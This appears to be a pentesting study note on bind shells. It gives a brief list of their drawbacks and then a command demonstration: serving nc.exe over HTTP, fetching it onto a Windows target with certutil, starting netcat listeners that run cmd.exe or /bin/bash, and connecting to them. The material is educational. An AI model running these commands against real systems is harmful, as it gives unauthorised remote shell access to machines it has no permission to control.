# Bind Shells

- Type of remote shell where the attacker connects directly to a listener on a target system.
- A netcat listener can be setup to execute a specific executable when a client connects

- Bind shells have many cons:
	- It needs to be setup on the target first (need access to it)
	- Firewall will typically block our connection as it is suspicious

## Demonstration

```bash
# transfer nc.exe
$ cd /usr/share/windows-binaries
$ python -m SimpleHTTPServer 80
...
# get exe
>certutil -urlcache -f http://<ip>/<exe> <exe>
# setup listener with exe
>nc.exe -lvnp 1234 -e cmd.exe
# connect
$ nc -nv <ip> <port>
# listener for linux
$ nc -lvnp <port> -c /bin/bash
# connect to
>nc.exe -nv <ip> <port>
```
